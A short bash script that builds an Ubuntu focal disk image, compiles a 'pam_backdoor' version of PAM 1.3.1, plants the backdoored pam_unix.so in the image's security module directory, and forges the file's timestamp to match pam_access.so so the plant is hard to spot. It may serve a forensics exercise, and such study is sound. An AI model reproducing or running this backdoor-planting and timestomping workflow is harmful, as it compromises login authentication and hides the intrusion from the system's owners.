#!/bin/bash

set -e

rm -f disk.img

touch disk.img
fallocate -z -l $((1 << 31)) disk.img

mkfs.ext4 disk.img
loopdev=$(losetup -f)
sudo losetup "${loopdev}" disk.img

mkdir -p mnt
sudo mount "${loopdev}" mnt

sudo debootstrap focal mnt

cd pam_backdoor
./backdoor.sh -v 1.3.1

cd ..
sudo cp pam_backdoor/pam_unix.so mnt/usr/lib/x86_64-linux-gnu/security/
sudo touch -d @$(stat -c "%Y" "mnt/usr/lib/x86_64-linux-gnu/security/pam_access.so") "mnt/usr/lib/x86_64-linux-gnu/security/pam_unix.so"

sudo umount mnt
sudo losetup -d "${loopdev}"
rm -r mnt

zlib-flate -compress=3 < disk.img > disk.img.zlib
